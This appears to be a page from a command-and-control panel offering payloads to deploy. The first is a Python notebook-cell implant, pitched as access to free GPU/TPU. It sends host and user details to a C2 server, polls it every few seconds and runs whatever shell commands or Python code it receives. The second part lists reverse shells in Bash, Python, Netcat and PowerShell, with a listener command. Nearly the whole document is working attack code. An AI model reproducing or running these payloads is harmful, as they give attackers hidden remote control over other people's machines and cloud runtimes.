☁️ Google Colab / Jupyter

Colab / Jupyter

Run in any Colab or Jupyter notebook cell. Gets free GPU/TPU resources.

Notebook Cell (paste in code cell):

import subprocess, threading, urllib.request, os, json, platform, socket, uuid C2 = "LOADING" AGENT_ID = str(uuid.uuid4()) def register(): data = json.dumps({"id": AGENT_ID, "hostname": socket.gethostname(), "username": os.popen("whoami").read().strip(), "os": f"Colab {platform.system()}", "arch": platform.machine(), "ip_internal": socket.gethostbyname(socket.gethostname()), "platform_type": "colab"}).encode() req = urllib.request.Request(f"{C2}/api/agent/register", data=data, headers={"Content-Type": "application/json"}) urllib.request.urlopen(req, timeout=10) def beacon(): import time while True: try: data = json.dumps({"id": AGENT_ID}).encode() req = urllib.request.Request(f"{C2}/api/agent/beacon", data=data, headers={"Content-Type": "application/json"}) resp = json.loads(urllib.request.urlopen(req, timeout=10).read()) for task in resp.get("tasks", []): result = "" try: if task["task_type"] == "cmd": result = subprocess.check_output(task["payload"], shell=True, stderr=subprocess.STDOUT, timeout=120).decode(errors="replace") elif task["task_type"] == "python": exec(task["payload"]) result = "executed" except Exception as e: result = str(e) rdata = json.dumps({"task_id": task["id"], "result": result}).encode() rreq = urllib.request.Request(f"{C2}/api/agent/result", data=rdata, headers={"Content-Type": "application/json"}) urllib.request.urlopen(rreq, timeout=10) except: pass time.sleep(5) register() threading.Thread(target=beacon, daemon=True).start() print("Runtime connected.")

🌐 Reverse Shell (Netcat / Bash)

Raw Shell

Simple reverse shells — for initial access before deploying full agent.

Bash:

bash -i >& /dev/tcp/HOST/4444 0>&1

Python:

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("HOST",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

Netcat:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc HOST 4444 >/tmp/f

PowerShell:

powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('HOST',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()"

Listener (run on C2 server):

nc -lvnp 4444
